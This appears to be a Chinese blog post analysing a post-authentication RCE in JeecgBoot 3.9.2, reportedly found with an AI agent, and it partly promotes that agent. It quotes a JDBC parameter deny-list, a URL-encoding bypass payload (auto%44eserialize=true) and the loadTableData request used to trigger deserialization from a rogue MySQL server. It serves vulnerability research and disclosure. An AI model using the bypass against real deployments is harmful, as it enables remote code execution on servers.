#  最新版Jeecgboot后台利用 | 从0写Reina之Jeecgboot-v3.9.2-后台RCE  
 李白你好   2026-06-25 23:30  
  
   
  
### 前言  
  
之前的文章提到过，当模型能力越来越强，agent能做的事情大概只有提供准确且精简的上下文，同时为了避免阻碍模型能力，减少上下文的填充，比如低质量或大量固定流程的skills，这一点在漏洞少的或那种长期挖掘的系统尤为重要  
  
同时agent应该提供模型稳定性，在写reina时这点更是重点，当然也不是为了盲目的消耗token，上下文压缩机制也是重点关注的内容。  
### （广告Time👻）:  
  
新版本Reina支持本地  
订阅导入，挖洞效率陡增~  
  
同时优化了UI，使用react重构项目，已优化缓存命中  
```
https://github.com/7-e1even/Reina-release
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qToicqBw1SVGcytCph3NsmiaiaSkUjMMb0yTDKCVjofP8njtppwHCefGu8x7CpeclHLaKHXPbsicBbG7zdL0D0gFbPCuTAgDUkg0YpA6Dq2WYGY/640?wx_fmt=png&from=appmsg "")  
### 一，漏洞篇  
  
现阶段让ai进行漏洞挖掘的流程很简单，给他一个git的地址仓库，一个服务器，一个/goal任务，然后一个稳定的agent场景即可，agent层面的优化已经能够让模型稳定的挖到漏洞。  
  
JeecgBoot 最新本地代码 3.9.2  
 中已经引入 JdbcSecurityUtil  
，试图通过 JDBC URL 危险参数黑名单阻断历史上常见的 JDBC 攻击参数，例如：  
- • autoDeserialize  
  
- • queryInterceptors  
  
- • statementInterceptors  
  
- • detectCustomCollations  
  
- • allowLoadLocalInfile  
  
但当前过滤实现是：  
```
String lowerUrl = jdbcUrl.toLowerCase();if (lowerUrl.contains(unsafeParam)) {    throw new JeecgBootException(...);}
```  
  
该逻辑没有对 JDBC URL 进行 URL decode，也没有按 JDBC Driver 的真实解析语义做规范化。MySQL Connector/J 在解析连接参数时会 URL decode 参数名和参数值，因此攻击者可以将黑名单关键词中的字符 URL 编码：  
```
auto%44eserialize=true
```  
  
JeecgBoot 侧看到的是：  
```
auto%44eserialize
```  
  
不会命中：  
```
autodeserialize
```  
  
但 MySQL Connector/J URL decode 后会识别为：  
```
autoDeserialize=true
```  
  
之后通过 JimuReport 的动态数据源能力注册恶意 MySQL 数据源，并调用会读取查询结果集的接口 /jmreport/loadTableData  
，即可让 MySQL Connector/J 在 ResultSet.getObject()  
 过程中对 rogue MySQL server 返回的 Java 序列化 BLOB 执行反序列化。可最终实现 RCE。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qToicqBw1SVEwYVkGGR0EQDWzoR3zfXmIako9I2ktyMszMicDGFcoy6ibic4ficdBLuI3bNRt1TMfUz7wv7BlAH8aghUicNECPnZD1JP8GCCd1icTc/640?wx_fmt=png&from=appmsg "")  
### 二，分析  
#### 2.1 分析一：JDBC URL 黑名单过滤可被 URL 编码绕过  
##### 2.1.1 代码位置  
  
文件：  
```
jeecg-boot/jeecg-boot-base-core/src/main/java/org/jeecg/common/util/security/JdbcSecurityUtil.java
```  
  
代码：  
```
private static final String[] UNSAFE_PARAMS = {        // === MySQL / MariaDB ===        "allowloadlocalinfile",        "allowurlinlocalinfile",        "allowloadlocalinfileinpath",        "autodeserialize",        "queryinterceptors",        "statementinterceptors",        "detectcustomcollations",        "maxallowedpacket",        ...};public static void validate(String jdbcUrl) {    if (oConvertUtils.isEmpty(jdbcUrl)) {        return;    }    String lowerUrl = jdbcUrl.toLowerCase();    for (String unsafeParam : UNSAFE_PARAMS) {        if (lowerUrl.contains(unsafeParam)) {            throw new JeecgBootException("连接地址有安全风险，包含不安全参数【" + unsafeParam + "】");        }    }}
```  
##### 2.1.2 问题分析  
  
当前防御思路是：  
1. 1. 将原始 JDBC URL 直接转小写；  
  
1. 2. 对黑名单关键词做 substring 匹配；  
  
1. 3. 匹配到即阻断。  
  
问题在于：JDBC URL 是一类需要由具体 JDBC Driver 解析的协议字符串。对 MySQL Connector/J 而言，URL 参数名和参数值会经过 URL decode 处理。安全过滤如果只检查原始字符串，而不检查 Driver 解析后的规范化结果，就会产生解析差异。  
  
例如：  
```
jdbc:mysql://127.0.0.1:3311/test?auto%44eserialize=true
```  
  
JeecgBoot 过滤看到的 lowercase 原文是：  
```
jdbc:mysql://127.0.0.1:3311/test?auto%44eserialize=true
```  
  
其中不包含连续字符串：  
```
autodeserialize
```  
  
所以通过校验。  
  
但 MySQL Connector/J 对参数名 URL decode 后得到：  
```
autoDeserialize
```  
  
最终仍然启用了危险配置。  
##### 2.1.3 绕过 payload  
```
jdbc:mysql://127.0.0.1:3311/test?auto%44eserialize=true&useSSL=false&connectTimeout=5000&socketTimeout=5000&allowPublicKeyRetrieval=true
```  
  
其中：  
```
auto%44eserialize
```  
  
URL decode 后为：  
```
autoDeserialize
```  
##### 2.1.4 为什么这是新代码仍可打  
  
仓库最新 3.9.2  
 已经包含扩展黑名单和二次校验，但过滤逻辑仍然基于原始 URL 文本：  
```
String lowerUrl = jdbcUrl.toLowerCase();lowerUrl.contains(unsafeParam)
```  
  
没有做以下任何一种处理：  
- • URL decode 后再检查；  
  
- • 多轮 decode；  
  
- • 按 JDBC Driver 真实参数解析结果检查；  
  
- • 参数名 canonicalization；  
  
- • 拒绝含 %xx  
 编码的危险参数名；  
  
- • 对 MySQL ConnectionUrlParser  
 的解析结果做安全判定。  
  
因此最新代码仍存在绕过。  
#### 2.2 分析二：动态数据源连接建立时仍信任被绕过的 URL  
##### 2.2.1 系统数据源入口  
  
文件：  
```
jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysDataSourceController.java
```  
  
添加数据源：  
```
@PostMapping(value = "/add")public Result<?> add(@RequestBody SysDataSource sysDataSource) {    try {        JdbcSecurityUtil.validate(sysDataSource.getDbUrl());        JdbcSecurityUtil.validateDriver(sysDataSource.getDbDriver());    } catch (JeecgBootException e) {        log.error(e.toString());        return Result.error("操作失败：" + e.getMessage());    }    return sysDataSourceService.saveDataSource(sysDataSource);}
```  
  
编辑数据源：  
```
@RequestMapping(value = "/edit", method ={RequestMethod.PUT, RequestMethod.POST})public Result<?> edit(@RequestBody SysDataSource sysDataSource) {    try {        JdbcSecurityUtil.validate(sysDataSource.getDbUrl());        JdbcSecurityUtil.validateDriver(sysDataSource.getDbDriver());    } catch (JeecgBootException e) {        log.error(e.toString());        return Result.error("操作失败：" + e.getMessage());    }    return sysDataSourceService.editDataSource(sysDataSource);}
```  
  
该入口做了 JdbcSecurityUtil.validate()  
，但由于 validate()  
 可被 URL 编码绕过，恶意 URL 可以保存。  
##### 2.2.2 连接建立处的二次校验同样可绕过  
  
文件：  
```
jeecg-boot/jeecg-boot-base-core/src/main/java/org/jeecg/common/util/dynamic/db/DynamicDBUtil.java
```  
  
代码：  
```
private static DruidDataSource getJdbcDataSource(final DynamicDataSourceModel dbSource) {    DruidDataSource dataSource = new DruidDataSource();    String driverClassName = dbSource.getDbDriver();    String url = dbSource.getDbUrl();    if (oConvertUtils.isEmpty(url) || !url.toLowerCase().startsWith("jdbc:")) {        throw new JeecgBootException("数据源URL配置格式不正确！");    }    // 纵深防御: 连接建立时二次校验 URL 和驱动安全性    JdbcSecurityUtil.validate(url);    JdbcSecurityUtil.validateDriver(driverClassName);    dataSource.setDriverClassName(driverClassName);    dataSource.setUrl(url);    ...    return dataSource;}
```  
  
虽然连接建立时再次调用 JdbcSecurityUtil.validate(url)  
，但二次校验与第一次校验使用同一套错误逻辑。因此只要注册阶段能绕过，连接阶段也能绕过。  
##### 2.2.3 数据源缓存与加载  
  
文件：  
```
jeecg-boot/jeecg-boot-base-core/src/main/java/org/jeecg/common/util/dynamic/db/DataSourceCachePool.java
```  
  
关键逻辑：  
```
public static DynamicDataSourceModel getCacheDynamicDataSourceModel(String dbKey) {    String redisCacheKey = CacheConstant.SYS_DYNAMICDB_CACHE + dbKey;    if (getRedisTemplate().hasKey(redisCacheKey)) {        return (DynamicDataSourceModel) getRedisTemplate().opsForValue().get(redisCacheKey);    }    CommonAPI commonApi = SpringContextUtils.getBean(CommonAPI.class);    DynamicDataSourceModel dbSource = commonApi.getDynamicDbSourceByCode(dbKey);    if (dbSource != null) {        getRedisTemplate().opsForValue().set(redisCacheKey, dbSource);    }    return dbSource;}
```  
  
动态数据源加载后会被缓存；只要恶意 URL 成功保存并首次连接成功，后续可复用。  
#### 2.3 分析三：JimuReport 的查询接口会读取 ResultSet 对象值  
##### 2.3.1 触发接口  
  
本次验证的可触发接口是：  
```
POST /jeecg-boot/jmreport/loadTableData
```  
  
请求体示例：  
```
{  "dbSource": "1227955254275006464",  "tableName": "",  "pageNo": 1,  "pageSize": 10,  "sql": "select 1",  "paramArray": ""}
```  
  
注意：dbSource  
 需要传 jimu_report_data_source.id  
，不是 code  
。如果传 code  
，容易进入异常路径，例如：  
```
Cannot invoke "Object.hashCode()" because "key" is null
```  
##### 2.3.2 JimuReport loadTableData 执行  
  
运行时反编译观察到的服务链路：  
```
DesignReportController.loadTableData  -> JmReportDbServiceImpl.loadTableData(dbSource, tableName, pageNo, pageSize, sql, paramArray)  -> JmreportDataSourceCachePool.getCacheDynamicDataSourceModel(dbSource)  -> 根据 dbType 生成分页 SQL  -> jmreportDynamicDbUtil.b(dbSource, pageSql, params)  -> 执行查询并读取结果
```  
  
本次 rogue server 观察到最终 SQL：  
```
select 1 LIMIT 10
```  
  
日志：  
```
[Q] select 1 LIMIT 10[!!!] SENDING PAYLOAD FOR APP SELECT (2810 bytes)
```  
#### 3.触发  
  
上面的链路里，最关键的点其实不是“能连上 rogue MySQL server”，而是“应用层会读取 rogue MySQL server 返回的结果集对象值”。  
  
MySQL Connector/J 8.0.27  
 仍支持如下连接参数：  
```
autoDeserialize=true
```  
  
那这样就可以完整的触发反序列化了，后续通过ai找到的利用链直接打jdbc即可,后续利用spring的链即可达到RCE的效果（  
Reina部分接入了java-chains工具，可查询有效的利用链  
）  
  
完成触发的是：  
```
JimuReport loadTableData  -> Spring / JDBC result mapping  -> ResultSet.getObject()  -> MySQL Connector/J autoDeserialize  -> ObjectInputStream.readObject()
```  
  
这也是为什么历史上常见的 queryInterceptors  
 方向在这里不是重点。目标使用的是 MySQL Connector/J 8.0.27  
，ServerStatusDiffInterceptor  
 旧链路在高版本里已经不再稳定走 getObject()  
，因此最后还是回到应用层查询结果读取这一条路。  
### 三，Agent局限性分析与作用  
  
专家意识，每次遇到人类专家很容易解决的问题，给到模型就很难解决，比如常利用的链子，模型常常需要人的提醒，哪怕只是方向上的提醒，模型很难自行进行。这可能和模型的预训练数据有关，这点在腾讯的渗透挑战也有体现，看了对话内容也可以发现，全场ak的也是需要人提醒https://challenge.zc.tencent.com/teams/[1]  
xxx  
  
同时会发现，模型很容易在一个方向疯狂探索，这也是安全研究与渗透测试不同的点，安全研究需要更多的绕过代码的机制，比如绕过黑白名单，而不是和渗透一样直接放弃一个方向。  
  
所以不只是需要一个让ai搜索的知识库，更多的是需要一个可以让他有方向意识的老师，这也是后续reina需要优化的方向，方向的多模型投票，或是其他的防止他停下来的机制。  
  
这类漏洞挖掘的案例靠模型一次性“猜中”并不现实。真正重要的是让它持续围绕一个目标推进：  
1. 1. 找到黑白名单，或是防护的方法；  
  
1. 2. 模型自行推进绕过；  
  
1. 3. 区分真实绕过和幻觉绕过；  
  
1. 4. 当模型遇到难点卡住，及时介入；  
  
1. 5. 用结果和多模型投票进行验证。  
  
这也是我的理解里 Reina 更适合做的事情：不是给模型堆一堆固定流程，而是让它在一个稳定场景里不断缩小问题空间。  
  
## 网络安全情报攻防站  
  
**www.libaisec.com**  
  
综合性的技术交流与资源共享社区  
  
专注于红蓝对抗、攻防渗透、威胁情报、数据泄露  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ft6csZH0gNW9S97jpPQXfZOtpibF8AmS6BgA5oBc74jWR0Vc5icCeOmPJIIJa1ORBRpTBlb1AIhQmFJBxjczSnRNyAmnM9oSLKOKHJGDQK3RY/640?wx_fmt=jpeg&from=appmsg "")  
  
  
